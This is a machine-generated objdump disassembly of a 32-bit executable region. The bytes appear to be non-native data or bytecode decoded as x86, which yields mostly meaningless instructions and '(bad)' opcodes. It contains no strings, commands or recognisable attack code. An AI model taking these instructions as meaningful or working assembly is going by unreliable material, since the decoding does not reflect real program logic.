  40a1f0:	02 00                	add    (%eax),%al
  40a1f2:	00 80 59 64 ff f5    	add    %al,-0xa009ba7(%eax)
  40a1f8:	04 00                	add    $0x0,%al
  40a1fa:	00 00                	add    %al,(%eax)
  40a1fc:	59                   	pop    %ecx
  40a1fd:	68 ff 0a 1a 00       	push   $0x1a0aff
  40a202:	14 00                	adc    $0x0,%al
  40a204:	32 06                	xor    (%esi),%al
  40a206:	00 60 ff             	add    %ah,-0x1(%eax)
  40a209:	5c                   	pop    %esp
  40a20a:	ff 58 ff             	lcall  *-0x1(%eax)
  40a20d:	1b 21                	sbb    (%ecx),%esp
  40a20f:	00 43 5c             	add    %al,0x5c(%ebx)
  40a212:	ff 04 5c             	incl   (%esp,%ebx,2)
  40a215:	ff 1b                	lcall  *(%ebx)
  40a217:	22 00                	and    (%eax),%al
  40a219:	43                   	inc    %ebx
  40a21a:	60                   	pusha
  40a21b:	ff 04 60             	incl   (%eax,%eiz,2)
  40a21e:	ff f5                	push   %ebp
  40a220:	01 00                	add    %eax,(%eax)
  40a222:	00 80 59 68 ff 0a    	add    %al,0xaff6859(%eax)
  40a228:	23 00                	and    (%eax),%eax
  40a22a:	0c 00                	or     $0x0,%al
  40a22c:	32 04 00             	xor    (%eax,%eax,1),%al
  40a22f:	60                   	pusha
  40a230:	ff 5c ff fd          	lcall  *-0x3(%edi,%edi,8)
  40a234:	95                   	xchg   %eax,%ebp
  40a235:	10 00                	adc    %al,(%eax)
  40a237:	00 80 70 40 00 08    	add    %al,0x8004070(%eax)
  40a23d:	00 24 00             	add    %ah,(%eax,%eax,1)
  40a240:	48                   	dec    %eax
  40a241:	01 28                	add    %ebp,(%eax)
  40a243:	00 00                	add    %al,(%eax)
  40a245:	00 00                	add    %al,(%eax)
  40a247:	00 00                	add    %al,(%eax)
  40a249:	00 13                	add    %dl,(%ebx)
  40a24b:	00 00                	add    %al,(%eax)
  40a24d:	00 00                	add    %al,(%eax)
  40a24f:	00 10                	add    %dl,(%eax)
  40a251:	00 00                	add    %al,(%eax)
  40a253:	00 00                	add    %al,(%eax)
  40a255:	00 01                	add    %al,(%ecx)
  40a257:	00 00                	add    %al,(%eax)
  40a259:	00 00                	add    %al,(%eax)
  40a25b:	01 6c ff 02          	add    %ebp,0x2(%edi,%edi,8)
  40a25f:	00 18                	add    %bl,(%eax)
  40a261:	00 00                	add    %al,(%eax)
  40a263:	00 00                	add    %al,(%eax)
  40a265:	00 03                	add    %al,(%ebx)
  40a267:	00 00                	add    %al,(%eax)
  40a269:	00 00                	add    %al,(%eax)
  40a26b:	00 60 ff             	add    %ah,-0x1(%eax)
  40a26e:	01 00                	add    %eax,(%eax)
  40a270:	5c                   	pop    %esp
  40a271:	ff 01                	incl   (%ecx)
  40a273:	00 58 ff             	add    %bl,-0x1(%eax)
  40a276:	01 00                	add    %eax,(%eax)
  40a278:	00 02                	add    %al,(%edx)
  40a27a:	00 05 4b ff ff 00    	add    %al,0xffff4b
  40a280:	0d f5 d0 07 00       	or     $0x7d0f5,%eax
  40a285:	00 0a                	add    %cl,(%edx)
  40a287:	06                   	push   %es
  40a288:	00 04 00             	add    %al,(%eax,%eax,1)
  40a28b:	3c 00                	cmp    $0x0,%al
  40a28d:	45                   	inc    %ebp
  40a28e:	0b 07                	or     (%edi),%eax
  40a290:	00 00                	add    %al,(%eax)
  40a292:	00 23                	add    %ah,(%ebx)
  40a294:	5c                   	pop    %esp
  40a295:	ff 04 60             	incl   (%eax,%eiz,2)
  40a298:	ff 04 64             	incl   (%esp,%eiz,2)
  40a29b:	ff 05 00 00 24 01    	incl   0x1240000
  40a2a1:	00 0d 14 00 02 00    	add    %cl,0x20014
  40a2a7:	08 64 ff 0d          	or     %ah,0xd(%edi,%edi,8)
  40a2ab:	58                   	pop    %eax
  40a2ac:	00 03                	add    %al,(%ebx)
  40a2ae:	00 6c 60 ff          	add    %ch,-0x1(%eax,%eiz,2)
  40a2b2:	2a 23                	sub    (%ebx),%ah
  40a2b4:	58                   	pop    %eax
  40a2b5:	ff 1b                	lcall  *(%ebx)
  40a2b7:	08 00                	or     %al,(%eax)
  40a2b9:	2a 46 48             	sub    0x48(%esi),%al
  40a2bc:	ff 0a                	decl   (%edx)
  40a2be:	09 00                	or     %eax,(%eax)
  40a2c0:	04 00                	add    $0x0,%al
  40a2c2:	32 06                	xor    (%esi),%al
  40a2c4:	00 5c ff 60          	add    %bl,0x60(%edi,%edi,8)
  40a2c8:	ff 58 ff             	lcall  *-0x1(%eax)
  40a2cb:	1a 64 ff 35          	sbb    0x35(%edi,%edi,8),%ah
  40a2cf:	48                   	dec    %eax
  40a2d0:	ff 00                	incl   (%eax)
  40a2d2:	36 1b 0a             	sbb    %ss:(%edx),%ecx
  40a2d5:	00 43 58             	add    %al,0x58(%ebx)
  40a2d8:	ff 04 58             	incl   (%eax,%ebx,2)
  40a2db:	ff 1b                	lcall  *(%ebx)
  40a2dd:	0b 00                	or     (%eax),%eax
  40a2df:	43                   	inc    %ebx
  40a2e0:	5c                   	pop    %esp
  40a2e1:	ff 04 5c             	incl   (%esp,%ebx,2)
  40a2e4:	ff 1b                	lcall  *(%ebx)
  40a2e6:	0c 00                	or     $0x0,%al
  40a2e8:	43                   	inc    %ebx
  40a2e9:	60                   	pusha
  40a2ea:	ff 04 60             	incl   (%eax,%eiz,2)
  40a2ed:	ff f5                	push   %ebp
  40a2ef:	01 00                	add    %eax,(%eax)
  40a2f1:	00 80 59 44 ff 0b    	add    %al,0xbff4459(%eax)
  40a2f7:	0d 00 10 00 31       	or     $0x31001000,%eax
  40a2fc:	68 ff 32 06 00       	push   $0x632ff
  40a301:	60                   	pusha
  40a302:	ff 5c ff 58          	lcall  *0x58(%edi,%edi,8)
  40a306:	ff 00                	incl   (%eax)
  40a308:	0d 6c 68 ff 1b       	or     $0x1bff686c,%eax
  40a30d:	0a 00                	or     (%eax),%al
  40a30f:	fb                   	sti
  40a310:	30 1c c0             	xor    %bl,(%eax,%eax,8)
  40a313:	00 00                	add    %al,(%eax)
  40a315:	24 04                	and    $0x4,%al
  40a317:	60                   	pusha
  40a318:	ff 04 64             	incl   (%esp,%eiz,2)
  40a31b:	ff 05 00 00 24 01    	incl   0x1240000
  40a321:	00 0d 14 00 02 00    	add    %cl,0x20014
  40a327:	08 64 ff 0d          	or     %ah,0xd(%edi,%edi,8)
  40a32b:	58                   	pop    %eax
  40a32c:	00 03                	add    %al,(%ebx)
  40a32e:	00 3e                	add    %bh,(%esi)
  40a330:	60                   	pusha
  40a331:	ff 31                	push   (%ecx)
  40a333:	68 ff 1a 64 ff       	push   $0xff641aff
  40a338:	00 42 04             	add    %al,0x4(%edx)
  40a33b:	60                   	pusha
  40a33c:	ff 04 64             	incl   (%esp,%eiz,2)
  40a33f:	ff 05 00 00 24 01    	incl   0x1240000
  40a345:	00 0d 14 00 02 00    	add    %cl,0x20014
  40a34b:	08 64 ff 0d          	or     %ah,0xd(%edi,%edi,8)
  40a34f:	58                   	pop    %eax
  40a350:	00 03                	add    %al,(%ebx)
  40a352:	00 6c 68 ff          	add    %ch,-0x1(%eax,%ebp,2)
  40a356:	1b 0e                	sbb    (%esi),%ecx
  40a358:	00 2a                	add    %ch,(%edx)
  40a35a:	fd                   	std
  40a35b:	c7                   	(bad)
  40a35c:	58                   	pop    %eax
  40a35d:	ff 6c 60 ff          	ljmp   *-0x1(%eax,%eiz,2)
  40a361:	1b 08                	sbb    (%eax),%ecx
  40a363:	00 2a                	add    %ch,(%edx)
  40a365:	fd                   	std
  40a366:	c7                   	(bad)
  40a367:	5c                   	pop    %esp
  40a368:	ff 0a                	decl   (%edx)
  40a36a:	0f 00 08             	str    (%eax)
  40a36d:	00 32                	add    %dh,(%edx)
  40a36f:	06                   	push   %es
  40a370:	00 60 ff             	add    %ah,-0x1(%eax)
  40a373:	5c                   	pop    %esp
  40a374:	ff 58 ff             	lcall  *-0x1(%eax)
  40a377:	1a 64 ff 00          	sbb    0x0(%edi,%edi,8),%ah
  40a37b:	33 0b                	xor    (%ebx),%ecx
  40a37d:	07                   	pop    %es
  40a37e:	00 00                	add    %al,(%eax)
  40a380:	00 31                	add    %dh,(%ecx)
  40a382:	40                   	inc    %eax
  40a383:	ff f5                	push   %ebp
  40a385:	02 00                	add    (%eax),%al
  40a387:	00 00                	add    %al,(%eax)
  40a389:	3e 40                	ds inc %eax
  40a38b:	ff 23                	jmp    *(%ebx)
  40a38d:	60                   	pusha
  40a38e:	ff 6c 68 ff          	ljmp   *-0x1(%eax,%ebp,2)
  40a392:	2a 23                	sub    (%ebx),%ah
  40a394:	5c                   	pop    %esp
  40a395:	ff 1b                	lcall  *(%ebx)
  40a397:	0e                   	push   %cs
  40a398:	00 2a                	add    %ch,(%edx)
  40a39a:	23 58 ff             	and    -0x1(%eax),%ebx
  40a39d:	0a 10                	or     (%eax),%dl
  40a39f:	00 08                	add    %cl,(%eax)
  40a3a1:	00 32                	add    %dh,(%edx)
  40a3a3:	08 00                	or     %al,(%eax)
  40a3a5:	60                   	pusha
  40a3a6:	ff 5c ff 58          	lcall  *0x58(%edi,%edi,8)
  40a3aa:	ff 40 ff             	incl   -0x1(%eax)
  40a3ad:	00 00                	add    %al,(%eax)
  40a3af:	fd                   	std
  40a3b0:	95                   	xchg   %eax,%ebp
  40a3b1:	10 00                	adc    %al,(%eax)
  40a3b3:	00 80 70 40 00 08    	add    %al,0x8004070(%eax)
  40a3b9:	00 3c 00             	add    %bh,(%eax,%eax,1)
  40a3bc:	3c 01                	cmp    $0x1,%al
  40a3be:	2c 00                	sub    $0x0,%al
  40a3c0:	00 00                	add    %al,(%eax)
  40a3c2:	00 00                	add    %al,(%eax)
  40a3c4:	00 00                	add    %al,(%eax)
  40a3c6:	13 00                	adc    (%eax),%eax
  40a3c8:	00 00                	add    %al,(%eax)
  40a3ca:	00 00                	add    %al,(%eax)
  40a3cc:	14 00                	adc    $0x0,%al
  40a3ce:	00 00                	add    %al,(%eax)
  40a3d0:	00 00                	add    %al,(%eax)
  40a3d2:	02 00                	add    (%eax),%al
  40a3d4:	00 00                	add    %al,(%eax)
  40a3d6:	00 01                	add    %al,(%ecx)
  40a3d8:	6c                   	insb   (%dx),%es:(%edi)
  40a3d9:	ff 02                	incl   (%edx)
  40a3db:	00 68 ff             	add    %ch,-0x1(%eax)
  40a3de:	01 00                	add    %eax,(%eax)
  40a3e0:	24 00                	and    $0x0,%al
  40a3e2:	00 00                	add    %al,(%eax)
  40a3e4:	00 00                	add    %al,(%eax)
  40a3e6:	06                   	push   %es
  40a3e7:	00 00                	add    %al,(%eax)
  40a3e9:	00 00                	add    %al,(%eax)
  40a3eb:	00 60 ff             	add    %ah,-0x1(%eax)
  40a3ee:	01 00                	add    %eax,(%eax)
  40a3f0:	5c                   	pop    %esp
  40a3f1:	ff 01                	incl   (%ecx)
  40a3f3:	00 58 ff             	add    %bl,-0x1(%eax)
  40a3f6:	01 00                	add    %eax,(%eax)
  40a3f8:	40                   	inc    %eax
  40a3f9:	ff 01                	incl   (%ecx)
  40a3fb:	00 64 ff 03          	add    %ah,0x3(%edi,%edi,8)
  40a3ff:	00 48 ff             	add    %cl,-0x1(%eax)
  40a402:	02 00                	add    (%eax),%al
  40a404:	00 08                	add    %cl,(%eax)
  40a406:	6c                   	insb   (%dx),%es:(%edi)
  40a407:	10 00                	adc    %al,(%eax)
  40a409:	43                   	inc    %ebx
  40a40a:	74 ff                	je     0x40a40b
  40a40c:	00 05 4b ff ff 00    	add    %al,0xffff4b
  40a412:	36 04 64             	ss add $0x64,%al
  40a415:	ff f4                	push   %esp
  40a417:	00 04 6c             	add    %al,(%esp,%ebp,2)
  40a41a:	ff f5                	push   %ebp
  40a41c:	00 00                	add    %al,(%eax)
  40a41e:	00 00                	add    %al,(%eax)
  40a420:	6c                   	insb   (%dx),%es:(%edi)
  40a421:	74 ff                	je     0x40a422
  40a423:	04 60                	add    $0x60,%al
  40a425:	ff 34 6c             	push   (%esp,%ebp,2)
  40a428:	60                   	pusha
  40a429:	ff 6c 0c 00          	ljmp   *0x0(%esp,%ecx,1)
  40a42d:	5e                   	pop    %esi
  40a42e:	16                   	push   %ss
  40a42f:	00 18                	add    %bl,(%eax)
  40a431:	00 71 5c             	add    %dh,0x5c(%ecx)
  40a434:	ff                   	(bad)
  40a435:	3c 6c                	cmp    $0x6c,%al
  40a437:	60                   	pusha
  40a438:	ff 04 74             	incl   (%esp,%esi,2)
  40a43b:	ff                   	(bad)
  40a43c:	fc                   	cld
  40a43d:	58                   	pop    %eax
  40a43e:	6c                   	insb   (%dx),%es:(%edi)
  40a43f:	5c                   	pop    %esp
  40a440:	ff 71 70             	push   0x70(%ecx)
  40a443:	ff 2f                	ljmp   *(%edi)
  40a445:	60                   	pusha
  40a446:	ff 00                	incl   (%eax)
  40a448:	0e                   	push   %cs
  40a449:	6c                   	insb   (%dx),%es:(%edi)
  40a44a:	70 ff                	jo     0x40a44b
  40a44c:	f5                   	cmc
  40a44d:	00 00                	add    %al,(%eax)
  40a44f:	00 00                	add    %al,(%eax)
  40a451:	c7                   	(bad)
  40a452:	1c 7d                	sbb    $0x7d,%al
  40a454:	01 02                	add    %eax,(%edx)
  40a456:	00 6c 6c ff          	add    %ch,-0x1(%esp,%ebp,2)
  40a45a:	71 58                	jno    0x40a4b4
  40a45c:	ff 00                	incl   (%eax)
  40a45e:	0e                   	push   %cs
  40a45f:	6c                   	insb   (%dx),%es:(%edi)
  40a460:	58                   	pop    %eax
  40a461:	ff f5                	push   %ebp
  40a463:	01 00                	add    %eax,(%eax)
  40a465:	00 00                	add    %al,(%eax)
  40a467:	c7                   	(bad)
  40a468:	1c 23                	sbb    $0x23,%al
  40a46a:	01 00                	add    %eax,(%eax)
  40a46c:	28 f5                	sub    %dh,%ch
  40a46e:	00 00                	add    %al,(%eax)
  40a470:	00 00                	add    %al,(%eax)
  40a472:	0b 17                	or     (%edi),%edx
  40a474:	00 04 00             	add    %al,(%eax,%eax,1)
  40a477:	46                   	inc    %esi
  40a478:	48                   	dec    %eax
  40a479:	ff 6c 64 ff          	ljmp   *-0x1(%esp,%eiz,2)
  40a47d:	04 38                	add    $0x38,%al
  40a47f:	ff 0a                	decl   (%edx)
  40a481:	18 00                	sbb    %al,(%eax)
  40a483:	0c 00                	or     $0x0,%al
  40a485:	04 38                	add    $0x38,%al
  40a487:	ff 60 31             	jmp    *0x31(%eax)
  40a48a:	68 ff 36 04 00       	push   $0x436ff
  40a48f:	48                   	dec    %eax
  40a490:	ff                   	(bad)
  40a491:	38 ff                	cmp    %bh,%bh
  40a493:	00 4f 04             	add    %cl,0x4(%edi)
  40a496:	64 ff 6c 68 ff       	ljmp   *%fs:-0x1(%eax,%ebp,2)
  40a49b:	04 34                	add    $0x34,%al
  40a49d:	ff 34 6c             	push   (%esp,%ebp,2)
  40a4a0:	34 ff                	xor    $0xff,%al
  40a4a2:	f5                   	cmc
  40a4a3:	00 00                	add    %al,(%eax)
  40a4a5:	00 00                	add    %al,(%eax)
  40a4a7:	59                   	pop    %ecx
  40a4a8:	5c                   	pop    %esp
  40a4a9:	ff f5                	push   %ebp
  40a4ab:	00 00                	add    %al,(%eax)
  40a4ad:	00 00                	add    %al,(%eax)
  40a4af:	6c                   	insb   (%dx),%es:(%edi)
  40a4b0:	74 ff                	je     0x40a4b1
  40a4b2:	04 60                	add    $0x60,%al
  40a4b4:	ff 34 6c             	push   (%esp,%ebp,2)
  40a4b7:	60                   	pusha
  40a4b8:	ff 6c 0c 00          	ljmp   *0x0(%esp,%ecx,1)
  40a4bc:	5e                   	pop    %esi
  40a4bd:	16                   	push   %ss
  40a4be:	00 18                	add    %bl,(%eax)
  40a4c0:	00 71 30             	add    %dh,0x30(%ecx)
  40a4c3:	ff                   	(bad)
  40a4c4:	3c 6c                	cmp    $0x6c,%al
  40a4c6:	60                   	pusha
  40a4c7:	ff 04 74             	incl   (%esp,%esi,2)
  40a4ca:	ff                   	(bad)
  40a4cb:	fc                   	cld
  40a4cc:	58                   	pop    %eax
  40a4cd:	6c                   	insb   (%dx),%es:(%edi)
  40a4ce:	34 ff                	xor    $0xff,%al
  40a4d0:	04 68                	add    $0x68,%al
  40a4d2:	ff                   	(bad)
  40a4d3:	fc                   	cld
  40a4d4:	58                   	pop    %eax
  40a4d5:	6c                   	insb   (%dx),%es:(%edi)
  40a4d6:	30 ff                	xor    %bh,%bh
  40a4d8:	71 70                	jno    0x40a54a
  40a4da:	ff 32                	push   (%edx)
  40a4dc:	04 00                	add    $0x0,%al
  40a4de:	60                   	pusha
  40a4df:	ff 34 ff             	push   (%edi,%edi,8)
  40a4e2:	00 0e                	add    %cl,(%esi)
  40a4e4:	6c                   	insb   (%dx),%es:(%edi)
  40a4e5:	70 ff                	jo     0x40a4e6
  40a4e7:	f5                   	cmc
  40a4e8:	00 00                	add    %al,(%eax)
  40a4ea:	00 00                	add    %al,(%eax)
  40a4ec:	c7                   	(bad)
  40a4ed:	1c 1e                	sbb    $0x1e,%al
  40a4ef:	01 00                	add    %eax,(%eax)
  40a4f1:	32 f5                	xor    %ch,%dh
  40a4f3:	01 00                	add    %eax,(%eax)
  40a4f5:	00 00                	add    %al,(%eax)
  40a4f7:	6c                   	insb   (%dx),%es:(%edi)
  40a4f8:	68 ff f5 00 00       	push   $0xf5ff
  40a4fd:	00 00                	add    %al,(%eax)
  40a4ff:	0b 17                	or     (%edi),%edx
  40a501:	00 04 00             	add    %al,(%eax,%eax,1)
  40a504:	23 60 ff             	and    -0x1(%eax),%esp
  40a507:	f5                   	cmc
  40a508:	00 00                	add    %al,(%eax)
  40a50a:	00 00                	add    %al,(%eax)
  40a50c:	fe                   	(bad)
  40a50d:	fd                   	std
  40a50e:	f5                   	cmc
  40a50f:	01 00                	add    %eax,(%eax)
  40a511:	00 00                	add    %al,(%eax)
  40a513:	ae                   	scas   %es:(%edi),%al
  40a514:	6c                   	insb   (%dx),%es:(%edi)
  40a515:	68 ff 0b 0f 00       	push   $0xf0bff
  40a51a:	08 00                	or     %al,(%eax)
  40a51c:	31 78 ff             	xor    %edi,-0x1(%eax)
  40a51f:	2f                   	das
  40a520:	60                   	pusha
  40a521:	ff 00                	incl   (%eax)
  40a523:	02 1e                	add    (%esi),%bl
  40a525:	7b 01                	jnp    0x40a528
  40a527:	00 02                	add    %al,(%edx)
  40a529:	00 3c 04             	add    %bh,(%esp,%eax,1)
  40a52c:	64 ff 04 2c          	incl   %fs:(%esp,%ebp,1)
  40a530:	ff f5                	push   %ebp
  40a532:	00 00                	add    %al,(%eax)
  40a534:	00 00                	add    %al,(%eax)
  40a536:	59                   	pop    %ecx
  40a537:	5c                   	pop    %esp
  40a538:	ff f5                	push   %ebp
  40a53a:	00 00                	add    %al,(%eax)
  40a53c:	00 00                	add    %al,(%eax)
  40a53e:	6c                   	insb   (%dx),%es:(%edi)
  40a53f:	74 ff                	je     0x40a540
  40a541:	04 60                	add    $0x60,%al
  40a543:	ff 34 6c             	push   (%esp,%ebp,2)
  40a546:	60                   	pusha
  40a547:	ff 6c 0c 00          	ljmp   *0x0(%esp,%ecx,1)
  40a54b:	5e                   	pop    %esi
  40a54c:	16                   	push   %ss
  40a54d:	00 18                	add    %bl,(%eax)
  40a54f:	00 71 30             	add    %dh,0x30(%ecx)
  40a552:	ff                   	(bad)
  40a553:	3c 6c                	cmp    $0x6c,%al
  40a555:	60                   	pusha
  40a556:	ff 04 74             	incl   (%esp,%esi,2)
  40a559:	ff                   	(bad)
  40a55a:	fc                   	cld
  40a55b:	58                   	pop    %eax
  40a55c:	6c                   	insb   (%dx),%es:(%edi)
  40a55d:	30 ff                	xor    %bh,%bh
  40a55f:	71 70                	jno    0x40a5d1
  40a561:	ff 2f                	ljmp   *(%edi)
  40a563:	60                   	pusha
  40a564:	ff 00                	incl   (%eax)
  40a566:	0e                   	push   %cs
  40a567:	6c                   	insb   (%dx),%es:(%edi)
  40a568:	70 ff                	jo     0x40a569
  40a56a:	f5                   	cmc
  40a56b:	00 00                	add    %al,(%eax)
  40a56d:	00 00                	add    %al,(%eax)
  40a56f:	c7                   	(bad)
  40a570:	1c 79                	sbb    $0x79,%al
  40a572:	01 00                	add    %eax,(%eax)
  40a574:	0a 6c 2c ff          	or     -0x1(%esp,%ebp,1),%ch
  40a578:	fb                   	sti
  40a579:	fe                   	(bad)
  40a57a:	31 78 ff             	xor    %edi,-0x1(%eax)
  40a57d:	00 02                	add    %al,(%edx)
  40a57f:	00 02                	add    %al,(%edx)
  40a581:	00 02                	add    %al,(%edx)
  40a583:	00 00                	add    %al,(%eax)
  40a585:	14 00                	adc    $0x0,%al
  40a587:	00 8c 71 40 00 0c 00 	add    %cl,0xc0040(%ecx,%esi,2)
  40a58e:	50                   	push   %eax
  40a58f:	00 84 01 30 00 00 00 	add    %al,0x30(%ecx,%eax,1)
  40a596:	00 00                	add    %al,(%eax)
  40a598:	4c                   	dec    %esp
  40a599:	00 13                	add    %dl,(%ebx)
  40a59b:	00 00                	add    %al,(%eax)
  40a59d:	00 00                	add    %al,(%eax)
  40a59f:	00 18                	add    %bl,(%eax)
  40a5a1:	00 00                	add    %al,(%eax)
  40a5a3:	00 00                	add    %al,(%eax)
  40a5a5:	00 03                	add    %al,(%ebx)
  40a5a7:	00 00                	add    %al,(%eax)
  40a5a9:	00 00                	add    %al,(%eax)
  40a5ab:	01 78 ff             	add    %edi,-0x1(%eax)
  40a5ae:	01 00                	add    %eax,(%eax)
  40a5b0:	68 ff 01 00 74       	push   $0x740001ff
  40a5b5:	ff 01                	incl   (%ecx)
  40a5b7:	00 1c 00             	add    %bl,(%eax,%eax,1)
  40a5ba:	00 00                	add    %al,(%eax)
  40a5bc:	00 00                	add    %al,(%eax)
  40a5be:	04 00                	add    $0x0,%al
  40a5c0:	00 00                	add    %al,(%eax)
  40a5c2:	00 00                	add    %al,(%eax)
  40a5c4:	60                   	pusha
  40a5c5:	ff 01                	incl   (%ecx)
  40a5c7:	00 34 ff             	add    %dh,(%edi,%edi,8)
  40a5ca:	01 00                	add    %eax,(%eax)
  40a5cc:	48                   	dec    %eax
  40a5cd:	ff 02                	incl   (%edx)
  40a5cf:	00 38                	add    %bh,(%eax)
  40a5d1:	ff 02                	incl   (%edx)
  40a5d3:	00 01                	add    %al,(%ecx)
  40a5d5:	00 2a                	add    %ch,(%edx)
  40a5d7:	01 00                	add    %eax,(%eax)
  40a5d9:	02 00                	add    (%eax),%al
  40a5db:	05 4b ff ff 00       	add    $0xffff4b,%eax
  40a5e0:	36 04 74             	ss add $0x74,%al
  40a5e3:	ff f5                	push   %ebp
  40a5e5:	01 00                	add    %eax,(%eax)
  40a5e7:	00 00                	add    %al,(%eax)
  40a5e9:	f5                   	cmc
  40a5ea:	00 00                	add    %al,(%eax)
  40a5ec:	00 00                	add    %al,(%eax)
  40a5ee:	80 10 00             	adcb   $0x0,(%eax)
  40a5f1:	04 5c                	add    $0x5c,%al
  40a5f3:	ff 34 6c             	push   (%esp,%ebp,2)
  40a5f6:	5c                   	pop    %esp
  40a5f7:	ff 80 0c 00 5e 02    	incl   0x25e000c(%eax)
  40a5fd:	00 14 00             	add    %dl,(%eax,%eax,1)
  40a600:	71 58                	jno    0x40a65a
  40a602:	ff                   	(bad)
  40a603:	3c 6c                	cmp    $0x6c,%al
  40a605:	5c                   	pop    %esp
  40a606:	ff 6c 10 00          	ljmp   *0x0(%eax,%edx,1)
  40a60a:	fc                   	cld
  40a60b:	58                   	pop    %eax
  40a60c:	6c                   	insb   (%dx),%es:(%edi)
  40a60d:	58                   	pop    %eax
  40a60e:	ff 71 70             	push   0x70(%ecx)
  40a611:	ff 2f                	ljmp   *(%edi)
  40a613:	5c                   	pop    %esp
  40a614:	ff 00                	incl   (%eax)
  40a616:	0e                   	push   %cs
  40a617:	6c                   	insb   (%dx),%es:(%edi)
  40a618:	70 ff                	jo     0x40a619
  40a61a:	f5                   	cmc
  40a61b:	00 00                	add    %al,(%eax)
  40a61d:	00 00                	add    %al,(%eax)
  40a61f:	cc                   	int3
  40a620:	1c 6a                	sbb    $0x6a,%al
  40a622:	00 00                	add    %al,(%eax)
  40a624:	08 1b                	or     %bl,(%ebx)
  40a626:	05 00 43 78 ff       	add    $0xff784300,%eax
  40a62b:	00 14 6c             	add    %dl,(%esp,%ebp,2)
  40a62e:	74 ff                	je     0x40a62f
  40a630:	5e                   	pop    %esi
  40a631:	03 00                	add    (%eax),%eax
  40a633:	04 00                	add    $0x0,%al
  40a635:	71 58                	jno    0x40a68f
  40a637:	ff                   	(bad)
  40a638:	3c 6c                	cmp    $0x6c,%al
  40a63a:	58                   	pop    %eax
  40a63b:	ff 71 70             	push   0x70(%ecx)
  40a63e:	ff 00                	incl   (%eax)
  40a640:	03 14 00             	add    (%eax,%eax,1),%edx
  40a643:	02 00                	add    (%eax),%al
  40a645:	0a f5                	or     %ch,%dh
  40a647:	00 00                	add    %al,(%eax)
  40a649:	00 00                	add    %al,(%eax)
  40a64b:	71 6c                	jno    0x40a6b9
  40a64d:	ff 00                	incl   (%eax)
  40a64f:	0e                   	push   %cs
  40a650:	6c                   	insb   (%dx),%es:(%edi)
  40a651:	70 ff                	jo     0x40a652
  40a653:	f5                   	cmc
  40a654:	00 00                	add    %al,(%eax)
  40a656:	00 00                	add    %al,(%eax)
  40a658:	c7                   	(bad)
  40a659:	1c 58                	sbb    $0x58,%al
  40a65b:	01 00                	add    %eax,(%eax)
  40a65d:	19 f5                	sbb    %esi,%ebp
  40a65f:	ff 00                	incl   (%eax)
  40a661:	00 00                	add    %al,(%eax)
  40a663:	04 48                	add    $0x48,%al
  40a665:	ff 0a                	decl   (%edx)
  40a667:	0d 00 08 00 04       	or     $0x4000800,%eax
  40a66c:	48                   	dec    %eax
  40a66d:	ff 60 31             	jmp    *0x31(%eax)
  40a670:	68 ff 35 48 ff       	push   $0xff4835ff
  40a675:	00 0a                	add    %cl,(%edx)
  40a677:	f5                   	cmc
  40a678:	ff 00                	incl   (%eax)
  40a67a:	00 00                	add    %al,(%eax)
  40a67c:	71 64                	jno    0x40a6e2
  40a67e:	ff 00                	incl   (%eax)
  40a680:	43                   	inc    %ebx
  40a681:	f5                   	cmc
  40a682:	00 00                	add    %al,(%eax)
  40a684:	00 00                	add    %al,(%eax)
  40a686:	f5                   	cmc
  40a687:	00 00                	add    %al,(%eax)
  40a689:	00 00                	add    %al,(%eax)
  40a68b:	fc                   	cld
  40a68c:	0e                   	push   %cs
  40a68d:	04 60                	add    $0x60,%al
  40a68f:	ff f5                	push   %ebp
  40a691:	00 00                	add    %al,(%eax)
  40a693:	00 00                	add    %al,(%eax)
  40a695:	04 64                	add    $0x64,%al
  40a697:	ff 6c 68 ff          	ljmp   *-0x1(%eax,%ebp,2)
  40a69b:	04 5c                	add    $0x5c,%al
  40a69d:	ff 34 6c             	push   (%esp,%ebp,2)
  40a6a0:	5c                   	pop    %esp
  40a6a1:	ff 6c 6c ff          	ljmp   *-0x1(%esp,%ebp,2)
  40a6a5:	6c                   	insb   (%dx),%es:(%edi)
  40a6a6:	74 ff                	je     0x40a6a7
  40a6a8:	5e                   	pop    %esi
  40a6a9:	11 00                	adc    %eax,(%eax)
  40a6ab:	20 00                	and    %al,(%eax)
  40a6ad:	71 58                	jno    0x40a707
  40a6af:	ff                   	(bad)
  40a6b0:	3c 6c                	cmp    $0x6c,%al
  40a6b2:	5c                   	pop    %esp
  40a6b3:	ff 04 68             	incl   (%eax,%ebp,2)
  40a6b6:	ff                   	(bad)
  40a6b7:	fc                   	cld
  40a6b8:	58                   	pop    %eax
  40a6b9:	6c                   	insb   (%dx),%es:(%edi)
  40a6ba:	58                   	pop    %eax
  40a6bb:	ff 71 70             	push   0x70(%ecx)
  40a6be:	ff 2f                	ljmp   *(%edi)
  40a6c0:	5c                   	pop    %esp
  40a6c1:	ff 00                	incl   (%eax)
  40a6c3:	0e                   	push   %cs
  40a6c4:	6c                   	insb   (%dx),%es:(%edi)
  40a6c5:	70 ff                	jo     0x40a6c6
  40a6c7:	f5                   	cmc
  40a6c8:	00 00                	add    %al,(%eax)
  40a6ca:	00 00                	add    %al,(%eax)
  40a6cc:	c7                   	(bad)
  40a6cd:	1c 43                	sbb    $0x43,%al
  40a6cf:	01 00                	add    %eax,(%eax)
  40a6d1:	10 6c 64 ff          	adc    %ch,-0x1(%esp,%eiz,2)
  40a6d5:	6c                   	insb   (%dx),%es:(%edi)
  40a6d6:	68 ff 0b 0f 00       	push   $0xf0bff
  40a6db:	08 00                	or     %al,(%eax)
  40a6dd:	31 68 ff             	xor    %ebp,-0x1(%eax)
  40a6e0:	00 16                	add    %dl,(%esi)
  40a6e2:	6c                   	insb   (%dx),%es:(%edi)
  40a6e3:	78 ff                	js     0x40a6e4
  40a6e5:	6c                   	insb   (%dx),%es:(%edi)
  40a6e6:	68 ff 2a 23 5c       	push   $0x5c232aff
  40a6eb:	ff 1b                	lcall  *(%ebx)
  40a6ed:	12 00                	adc    (%eax),%al
  40a6ef:	2a 31                	sub    (%ecx),%dh
  40a6f1:	78 ff                	js     0x40a6f2
  40a6f3:	2f                   	das
  40a6f4:	5c                   	pop    %esp
  40a6f5:	ff 00                	incl   (%eax)
  40a6f7:	25 6c 78 ff 6c       	and    $0x6cff786c,%eax
  40a6fc:	68 ff 6c 74 ff       	push   $0xff746cff
  40a701:	0b 0a                	or     (%edx),%ecx
  40a703:	00 08                	add    %cl,(%eax)
  40a705:	00 23                	add    %ah,(%ebx)
  40a707:	5c                   	pop    %esp
  40a708:	ff 2a                	ljmp   *(%edx)
  40a70a:	23 44 ff 1b          	and    0x1b(%edi,%edi,8),%eax
  40a70e:	10 00                	adc    %al,(%eax)
